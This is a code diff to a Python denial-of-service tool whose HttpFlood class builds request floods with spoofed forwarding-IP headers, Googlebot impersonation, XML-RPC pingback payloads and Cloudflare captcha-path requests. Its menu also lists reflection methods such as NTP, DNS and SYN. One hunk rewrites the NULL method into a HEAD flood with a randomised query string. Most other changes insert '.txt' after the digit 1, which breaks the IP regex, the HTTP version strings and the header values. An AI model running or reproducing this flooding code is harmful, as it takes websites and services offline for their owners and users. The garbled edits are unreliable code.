@@ -135,12 +135,12 @@ class Methods:
 
 
 google_agents = [
-    "Mozila/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
-    "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, "
-    "like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; "
+    "Mozila/5.0 (compatible; Googlebot/2.1.txt; +http://www.google.com/bot.html)",
+    "Mozilla/5.0 (Linux; Android 6.0.1.txt; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, "
+    "like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1.txt; "
     "+http://www.google.com/bot.html)) "
-    "Googlebot/2.1 (+http://www.google.com/bot.html)",
-    "Googlebot/2.1 (+http://www.googlebot.com/bot.html)"
+    "Googlebot/2.1.txt (+http://www.google.com/bot.html)",
+    "Googlebot/2.1.txt (+http://www.googlebot.com/bot.html)"
 ]
 
 
@@ -165,7 +165,7 @@ BYTES_SEND = Counter()
 
 
 class Tools:
-    IP = compile("(?:\d{1,3}\.){3}\d{1,3}")
+    IP = compile("(?:\d{1.txt,3}\.){3}\d{1.txt,3}")
     protocolRex = compile('"protocol":(\d+)')
 
     @staticmethod
@@ -233,9 +233,9 @@ class Tools:
                 "Sec-Fetch-Dest": "document",
                 "Sec-Fetch-Mode": "navigate",
                 "Sec-Fetch-Site": "none",
-                "Sec-Fetch-User": "?1",
+                "Sec-Fetch-User": "?1.txt",
                 "TE": "trailers",
-                "DNT": "1"
+                "DNT": "1.txt"
             }
             with s.get(url, headers=hdrs) as ss:
                 for key, value in ss.cookies.items():
@@ -730,35 +730,35 @@ class HttpFlood(Thread):
                 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36 Edge/18.19577',
                 'Mozilla/5.0 (X11) AppleWebKit/62.41 (KHTML, like Gecko) Edge/17.10859 Safari/452.6',
                 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14931',
-                'Chrome (AppleWebKit/537.1; Chrome50.0; Windows NT 6.3) AppleWebKit/537.36 (KHTML like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14393',
+                'Chrome (AppleWebKit/537.1.txt; Chrome50.0; Windows NT 6.3) AppleWebKit/537.36 (KHTML like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14393',
                 'Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/46.0.2486.0 Safari/537.36 Edge/13.9200',
                 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/46.0.2486.0 Safari/537.36 Edge/13.10586',
                 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246',
                 'Mozilla/5.0 (Linux; U; Android 4.0.3; ko-kr; LG-L160L Build/IML74K) AppleWebkit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30',
                 'Mozilla/5.0 (Linux; U; Android 4.0.3; de-ch; HTC Sensation Build/IML74K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30',
                 'Mozilla/5.0 (Linux; U; Android 2.3; en-us) AppleWebKit/999+ (KHTML, like Gecko) Safari/999.9',
-                'Mozilla/5.0 (Linux; U; Android 2.3.5; zh-cn; HTC_IncredibleS_S710e Build/GRJ90) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1',
-                'Mozilla/5.0 (Linux; U; Android 2.3.5; en-us; HTC Vision Build/GRI40) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1',
-                'Mozilla/5.0 (Linux; U; Android 2.3.4; fr-fr; HTC Desire Build/GRJ22) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1',
-                'Mozilla/5.0 (Linux; U; Android 2.3.4; en-us; T-Mobile myTouch 3G Slide Build/GRI40) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1',
-                'Mozilla/5.0 (Linux; U; Android 2.3.3; zh-tw; HTC_Pyramid Build/GRI40) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1',
-                'Mozilla/5.0 (Linux; U; Android 2.3.3; zh-tw; HTC_Pyramid Build/GRI40) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari',
-                'Mozilla/5.0 (Linux; U; Android 2.3.3; zh-tw; HTC Pyramid Build/GRI40) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1',
-                'Mozilla/5.0 (Linux; U; Android 2.3.3; ko-kr; LG-LU3000 Build/GRI40) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1',
-                'Mozilla/5.0 (Linux; U; Android 2.3.3; en-us; HTC_DesireS_S510e Build/GRI40) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1',
-                'Mozilla/5.0 (Linux; U; Android 2.3.3; en-us; HTC_DesireS_S510e Build/GRI40) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile',
-                'Mozilla/5.0 (Linux; U; Android 2.3.3; de-de; HTC Desire Build/GRI40) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1',
-                'Mozilla/5.0 (Linux; U; Android 2.3.3; de-ch; HTC Desire Build/FRF91) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1',
-                'Mozilla/5.0 (Linux; U; Android 2.2; fr-lu; HTC Legend Build/FRF91) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1',
-                'Mozilla/5.0 (Linux; U; Android 2.2; en-sa; HTC_DesireHD_A9191 Build/FRF91) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1',
-                'Mozilla/5.0 (Linux; U; Android 2.2.1; fr-fr; HTC_DesireZ_A7272 Build/FRG83D) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1',
-                'Mozilla/5.0 (Linux; U; Android 2.2.1; en-gb; HTC_DesireZ_A7272 Build/FRG83D) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1',
-                'Mozilla/5.0 (Linux; U; Android 2.2.1; en-ca; LG-P505R Build/FRG83) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1'
+                'Mozilla/5.0 (Linux; U; Android 2.3.5; zh-cn; HTC_IncredibleS_S710e Build/GRJ90) AppleWebKit/533.1.txt (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1.txt',
+                'Mozilla/5.0 (Linux; U; Android 2.3.5; en-us; HTC Vision Build/GRI40) AppleWebKit/533.1.txt (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1.txt',
+                'Mozilla/5.0 (Linux; U; Android 2.3.4; fr-fr; HTC Desire Build/GRJ22) AppleWebKit/533.1.txt (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1.txt',
+                'Mozilla/5.0 (Linux; U; Android 2.3.4; en-us; T-Mobile myTouch 3G Slide Build/GRI40) AppleWebKit/533.1.txt (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1.txt',
+                'Mozilla/5.0 (Linux; U; Android 2.3.3; zh-tw; HTC_Pyramid Build/GRI40) AppleWebKit/533.1.txt (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1.txt',
+                'Mozilla/5.0 (Linux; U; Android 2.3.3; zh-tw; HTC_Pyramid Build/GRI40) AppleWebKit/533.1.txt (KHTML, like Gecko) Version/4.0 Mobile Safari',
+                'Mozilla/5.0 (Linux; U; Android 2.3.3; zh-tw; HTC Pyramid Build/GRI40) AppleWebKit/533.1.txt (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1.txt',
+                'Mozilla/5.0 (Linux; U; Android 2.3.3; ko-kr; LG-LU3000 Build/GRI40) AppleWebKit/533.1.txt (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1.txt',
+                'Mozilla/5.0 (Linux; U; Android 2.3.3; en-us; HTC_DesireS_S510e Build/GRI40) AppleWebKit/533.1.txt (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1.txt',
+                'Mozilla/5.0 (Linux; U; Android 2.3.3; en-us; HTC_DesireS_S510e Build/GRI40) AppleWebKit/533.1.txt (KHTML, like Gecko) Version/4.0 Mobile',
+                'Mozilla/5.0 (Linux; U; Android 2.3.3; de-de; HTC Desire Build/GRI40) AppleWebKit/533.1.txt (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1.txt',
+                'Mozilla/5.0 (Linux; U; Android 2.3.3; de-ch; HTC Desire Build/FRF91) AppleWebKit/533.1.txt (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1.txt',
+                'Mozilla/5.0 (Linux; U; Android 2.2; fr-lu; HTC Legend Build/FRF91) AppleWebKit/533.1.txt (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1.txt',
+                'Mozilla/5.0 (Linux; U; Android 2.2; en-sa; HTC_DesireHD_A9191 Build/FRF91) AppleWebKit/533.1.txt (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1.txt',
+                'Mozilla/5.0 (Linux; U; Android 2.2.1.txt; fr-fr; HTC_DesireZ_A7272 Build/FRG83D) AppleWebKit/533.1.txt (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1.txt',
+                'Mozilla/5.0 (Linux; U; Android 2.2.1.txt; en-gb; HTC_DesireZ_A7272 Build/FRG83D) AppleWebKit/533.1.txt (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1.txt',
+                'Mozilla/5.0 (Linux; U; Android 2.2.1.txt; en-ca; LG-P505R Build/FRG83) AppleWebKit/533.1.txt (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1.txt'
             ]
         self._useragents = list(useragents)
         self._req_type = self.getMethodType(method)
         self._defaultpayload = "%s %s HTTP/%s\r\n" % (self._req_type,
-                                                      target.raw_path_qs, randchoice(['1.0', '1.1', '1.2']))
+                                                      target.raw_path_qs, randchoice(['1.txt.0', '1.txt.1.txt', '1.txt.2']))
         self._payload = (self._defaultpayload +
                          'Accept-Encoding: gzip, deflate, br\r\n'
                          'Accept-Language: en-US,en;q=0.9\r\n'
@@ -767,10 +767,10 @@ class HttpFlood(Thread):
                          'Sec-Fetch-Dest: document\r\n'
                          'Sec-Fetch-Mode: navigate\r\n'
                          'Sec-Fetch-Site: none\r\n'
-                         'Sec-Fetch-User: ?1\r\n'
-                         'Sec-Gpc: 1\r\n'
+                         'Sec-Fetch-User: ?1.txt\r\n'
+                         'Sec-Gpc: 1.txt\r\n'
                          'Pragma: no-cache\r\n'
-                         'Upgrade-Insecure-Requests: 1\r\n')
+                         'Upgrade-Insecure-Requests: 1.txt\r\n')
 
     def select(self, name: str) -> None:
         self.SENT_FLOOD = self.GET
@@ -788,7 +788,7 @@ class HttpFlood(Thread):
     def SpoofIP(self) -> str:
         spoof: str = ProxyTools.Random.rand_ipv4()
         return ("X-Forwarded-Proto: Http\r\n"
-                f"X-Forwarded-Host: {self._target.raw_host}, 1.1.1.1\r\n"
+                f"X-Forwarded-Host: {self._target.raw_host}, 1.txt.1.txt.1.txt.1.txt\r\n"
                 f"Via: {spoof}\r\n"
                 f"Client-IP: {spoof}\r\n"
                 f'X-Forwarded-For: {spoof}\r\n'
@@ -875,7 +875,7 @@ class HttpFlood(Thread):
     def COOKIES(self) -> None:
         payload: bytes = self.generate_payload(
             "Cookie: _ga=GA%s;"
-            " _gat=1;"
+            " _gat=1.txt;"
             " __cfduid=dc232334gwdsd23434542342342342475611928;"
             " %s=%s\r\n" %
             (ProxyTools.Random.rand_int(1000, 99999), ProxyTools.Random.rand_str(6),
@@ -901,7 +901,7 @@ class HttpFlood(Thread):
             ("Content-Length: 345\r\n"
              "X-Requested-With: XMLHttpRequest\r\n"
              "Content-Type: application/xml\r\n\r\n"
-             "<?xml version='1.0' encoding='iso-8859-1'?>"
+             "<?xml version='1.txt.0' encoding='iso-8859-1.txt'?>"
              "<methodCall><methodName>pingback.ping</methodName>"
              "<params><param><value><string>%s</string></value>"
              "</param><param><value><string>%s</string>"
@@ -938,13 +938,13 @@ class HttpFlood(Thread):
     def BOT(self) -> None:
         payload: bytes = self.generate_payload()
         p1, p2 = str.encode(
-            "GET /robots.txt HTTP/1.1\r\n"
+            "GET /robots.txt HTTP/1.txt.1.txt\r\n"
             "Host: %s\r\n" % self._target.raw_authority +
             "Connection: Keep-Alive\r\n"
             "Accept: text/plain,text/html,*/*\r\n"
             "User-Agent: %s\r\n" % randchoice(google_agents) +
             "Accept-Encoding: gzip,deflate,br\r\n\r\n"), str.encode(
-            "GET /sitemap.xml HTTP/1.1\r\n"
+            "GET /sitemap.xml HTTP/1.txt.1.txt\r\n"
             "Host: %s\r\n" % self._target.raw_authority +
             "Connection: Keep-Alive\r\n"
             "Accept: */*\r\n"
@@ -1091,7 +1091,7 @@ class HttpFlood(Thread):
         Tools.safe_close(s)
 
     def GSB(self):
-        payload = str.encode("%s %s?qs=%s HTTP/1.1\r\n" % (self._req_type,
+        payload = str.encode("%s %s?qs=%s HTTP/1.txt.1.txt\r\n" % (self._req_type,
                                                            self._target.raw_path_qs,
                                                            ProxyTools.Random.rand_str(6)) +
                              "Host: %s\r\n" % self._target.authority +
@@ -1103,10 +1103,10 @@ class HttpFlood(Thread):
                              'Sec-Fetch-Dest: document\r\n'
                              'Sec-Fetch-Mode: navigate\r\n'
                              'Sec-Fetch-Site: none\r\n'
-                             'Sec-Fetch-User: ?1\r\n'
-                             'Sec-Gpc: 1\r\n'
+                             'Sec-Fetch-User: ?1.txt\r\n'
+                             'Sec-Gpc: 1.txt\r\n'
                              'Pragma: no-cache\r\n'
-                             'Upgrade-Insecure-Requests: 1\r\n\r\n')
+                             'Upgrade-Insecure-Requests: 1.txt\r\n\r\n')
         s = None
         with suppress(Exception), self.open_connection() as s:
             for _ in range(self._rpc):
@@ -1115,7 +1115,7 @@ class HttpFlood(Thread):
 
     def RHEX(self):
         randhex = str(randbytes(randchoice([32, 64, 128])))
-        payload = str.encode("%s %s/%s HTTP/1.1\r\n" % (self._req_type,
+        payload = str.encode("%s %s/%s HTTP/1.txt.1.txt\r\n" % (self._req_type,
                                                         self._target.authority,
                                                         randhex) +
                              "Host: %s/%s\r\n" % (self._target.authority, randhex) +
@@ -1127,10 +1127,10 @@ class HttpFlood(Thread):
                              'Sec-Fetch-Dest: document\r\n'
                              'Sec-Fetch-Mode: navigate\r\n'
                              'Sec-Fetch-Site: none\r\n'
-                             'Sec-Fetch-User: ?1\r\n'
-                             'Sec-Gpc: 1\r\n'
+                             'Sec-Fetch-User: ?1.txt\r\n'
+                             'Sec-Gpc: 1.txt\r\n'
                              'Pragma: no-cache\r\n'
-                             'Upgrade-Insecure-Requests: 1\r\n\r\n')
+                             'Upgrade-Insecure-Requests: 1.txt\r\n\r\n')
         s = None
         with suppress(Exception), self.open_connection() as s:
             for _ in range(self._rpc):
@@ -1145,10 +1145,10 @@ class HttpFlood(Thread):
                'Sec-Fetch-Dest: document\r\n'
                'Sec-Fetch-Mode: navigate\r\n'
                'Sec-Fetch-Site: none\r\n'
-               'Sec-Fetch-User: ?1\r\n'
-               'Sec-Gpc: 1\r\n'
+               'Sec-Fetch-User: ?1.txt\r\n'
+               'Sec-Gpc: 1.txt\r\n'
                'Pragma: no-cache\r\n'
-               'Upgrade-Insecure-Requests: 1\r\n\r\n')
+               'Upgrade-Insecure-Requests: 1.txt\r\n\r\n')
         hexh = r'\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87' \
                r'\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F' \
                r'\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F' \
@@ -1160,12 +1160,12 @@ class HttpFlood(Thread):
                r'\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99' \
                r'\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C' \
                r'\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA '
-        p1, p2 = str.encode("%s %s/%s HTTP/1.1\r\n" % (self._req_type,
+        p1, p2 = str.encode("%s %s/%s HTTP/1.txt.1.txt\r\n" % (self._req_type,
                                                        self._target.authority,
                                                        hexh) +
                             "Host: %s/%s\r\n" % (self._target.authority, hexh) +
                             self.randHeadercontent + dep), str.encode(
-            "%s %s/cdn-cgi/l/chk_captcha HTTP/1.1\r\n" % (self._req_type,
+            "%s %s/cdn-cgi/l/chk_captcha HTTP/1.txt.1.txt\r\n" % (self._req_type,
                                                           self._target.authority) +
             "Host: %s\r\n" % hexh +
             self.randHeadercontent + dep)
@@ -1177,11 +1177,25 @@ class HttpFlood(Thread):
         Tools.safe_close(s)
 
     def NULL(self) -> None:
-        payload: Any = str.encode(self._payload +
-                                  f"Host: {self._target.authority}\r\n" +
-                                  "User-Agent: null\r\n" +
-                                  "Referrer: null\r\n" +
-                                  self.SpoofIP + "\r\n")
+        random_path = f"{self._target.raw_path_qs}?{ProxyTools.Random.rand_str(6)}={ProxyTools.Random.rand_str(32)}"
+        payload = str.encode(
+            f"HEAD {random_path} HTTP/1.1\r\n"
+            f"Host: {self._target.authority}\r\n"
+            "User-Agent: null\r\n"
+            "Referer: null\r\n"
+            "Connection: null\r\n"
+            f"X-Forwarded-For: {ProxyTools.Random.rand_ipv4()}\r\n"
+            "Accept-Encoding: gzip, deflate, br\r\n"
+            "Accept-Language: en-US,en;q=0.9\r\n"
+            "Cache-Control: max-age=0\r\n"
+            "Sec-Fetch-Dest: document\r\n"
+            "Sec-Fetch-Mode: navigate\r\n"
+            "Sec-Fetch-Site: none\r\n"
+            "Sec-Fetch-User: ?1\r\n"
+            "Sec-Gpc: 1\r\n"
+            "Pragma: no-cache\r\n"
+            "Upgrade-Insecure-Requests: 1\r\n\r\n"
+        )
         s = None
         with suppress(Exception), self.open_connection() as s:
             for _ in range(self._rpc):
@@ -1451,7 +1465,7 @@ class ToolsConsole:
                   '         - 6 = RANDOM\n'
                   '         - 5 = SOCKS5\n'
                   '         - 4 = SOCKS4\n'
-                  '         - 1 = HTTP\n'
+                  '         - 1.txt = HTTP\n'
                   '         - 0 = ALL\n'
                   ' > Methods:\n'
                   ' - Layer4\n'
@@ -1507,7 +1521,7 @@ class ToolsConsole:
 
 def handleProxyList(con, proxy_li, proxy_ty, url=None):
     if proxy_ty not in {4, 5, 1, 0, 6}:
-        exit("Socks Type Not Found [4, 5, 1, 0, 6]")
+        exit("Socks Type Not Found [4, 5, 1.txt, 0, 6]")
     if proxy_ty == 6:
         proxy_ty = randchoice([4, 5, 1])
     if not proxy_li.exists():
@@ -1641,7 +1655,7 @@ if __name__ == '__main__':
                     exit('Cannot resolve hostname ', url.host, e)
 
                 if port > 65535 or port < 1:
-                    exit("Invalid Port [Min: 1 / Max: 65535] ")
+                    exit("Invalid Port [Min: 1.txt / Max: 65535] ")
 
                 if method in {"NTP", "DNS", "RDP", "CHAR", "MEM", "CLDAP", "ARD", "SYN", "ICMP"} and \
                         not ToolsConsole.checkRawSocket():
